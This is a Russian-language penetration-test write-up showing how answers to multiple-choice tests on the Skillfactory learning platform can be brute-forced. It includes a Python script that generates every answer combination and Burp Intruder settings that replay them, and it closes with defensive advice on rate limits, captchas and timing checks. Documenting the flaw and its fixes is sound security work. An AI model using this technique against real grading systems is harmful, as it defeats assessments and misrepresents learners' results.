# Skillfactory Permutation Brute-Force Vulnerability

## 🔍 Initialization

### Есть тест, предполагающий несколько вариантов правильных ответов.  
![init](screenshots/01.png)


## 🕵️ Enumeration

### Перехватываю отправляемый запрос в Burp Suite  
![burp_intercept](screenshots/02.png) 
  
  
#### Payload в URL encoded:  
```html
input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[]=choice_0
```

#### Если ответ неправильный, то в `Response` возвращается `json`, содержащий `"success": "incorrect"`  

### Смотрю исходный код отмеченного чекбокса
![html](screenshots/03.png)  

#### Т.е. получается, что в запросе отправляется `name` и `value` отмеченных чекбоксов.

### Составляю список всех имен и значений чекбоксов в этом вопросе  
| name | value |
|------|-------|
| input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[] | choice_0 |
| input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[] | choice_1 |
| input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[] | choice_2 |
| input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[] | choice_3 |
| input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[] | choice_4 |
| input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[] | choice_5 |
| input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[] | choice_6 |


- `name` - это идентификатор вопроса  
- `value` - идентификаторы чекбоксов, которые проставляются по индексу в массиве
  

### Зная всё это, легко написать скрипт, который будет принимать `идентификатор вопроса` и `количество вариантов`, и составлять словарь со всеми возможными комбинациями:
```python
import itertools
import argparse
from urllib.parse import quote

def generate_combinations(input_name: str, n: int) -> str:
    digits = list(range(n))
    results = []
    
    for j in range(1, len(digits) + 1):
        for comb in itertools.combinations(digits, j):
            param_pairs = [f"{input_name}=choice_{x}" for x in comb]
            query_string = "&".join(param_pairs)
            encoded_query = quote(query_string, safe='=&')
            results.append(encoded_query)
    
    return '\n'.join(results)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Generate URL-encoded combinations.')
    parser.add_argument('--name', type=str, required=True, help='Input name (e.g., "input_name[]")')
    parser.add_argument('--count', type=int, required=True, help='Number of choices (n)')
    parser.add_argument('--output', type=str, default='skill.lst', help='Output file path (default: skill.lst)')
    args = parser.parse_args()

    output_text = generate_combinations(args.name, args.count)
    
    with open(args.output, 'w') as f:
        f.write(output_text)
    
    print(f"Generated {output_text.count('\n') + 1} combinations, saved to: {args.output}")
```

## 🎯 Exploitation

### Генерирую словарь
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/RealProjects/Skillfactory/PermutationsBruteForce]
└─$ python3 xx.py --name 'input_7e44eb6d37ea49b8844fa93a96ea014f_2_1[]' --count 7 --output skill.lst
Generated 127 combinations, saved to: skill.lst
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/RealProjects/Skillfactory/PermutationsBruteForce]
└─$ head -n 2 < skill.lst                                                                           
input_7e44eb6d37ea49b8844fa93a96ea014f_2_1%5B%5D=choice_0
input_7e44eb6d37ea49b8844fa93a96ea014f_2_1%5B%5D=choice_1
```

### Отправляю перехваченный в `Burp Suite` запрос в `Intruder`.  
Добавляю `Position` на всю `payload` post запроса.  
Загружаю сгенерированный скриптом словарь, содержащий в данном случае 127 комбинаций.  
Убираю отметку `URL-encode these chatacters`  
![burp_intruder](screenshots/04.png)


### Настраиваю вкладку `Settings` для `Intruder`.  
Добавляю остановку атаки, если в `Response` будет отсутствовать `"success": "incorrect"`.  
<div align="center">
  <img src="screenshots/05.png" alt="burp_settings">
</div>


### Также хочу отобразить дополнительную колонку в результатах вывода, с помощью `Grep - Extract`  
![grep_extract](screenshots/06.png)


### Сортирую результаты атаки по дополнительному столбцу и получаю правильную комбинацию ответов:  
![burp_attack](screenshots/07.png)  


## 🏁 Result
Если запускать атаку синхронно, то достаточно будет просто обновить страницу в браузере, вопрос автоматически будет отмечен, как правильно отвеченный.  
Но так как в данном случае атака происходила асинхронно, необходимо отметить правильные варианты и нажать **Отправить**  
![result](screenshots/08.png)


## 📋 Резюме

🧰 **Инструменты:**
  - Firefox, Burp Suite, python3  

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Permutation Brute-Force
    - Нет ограничений на количество попыток (неограниченные запросы)
    - Нет задержки между попытками
    - Нет блокировки после множества неудачных попыток

🛡 **Советы по защите:**
  - Логировать подозрительную активность и ввести механизмы защиты
    - Ввести ограничение на попытки (например, 10-20 попыток на задание в течение дня)
    - Добавить капчу после нескольких неудачных ответов
    - Засекать время между ответами (если ответы приходят слишком быстро и их много — блокировать до конца дня)
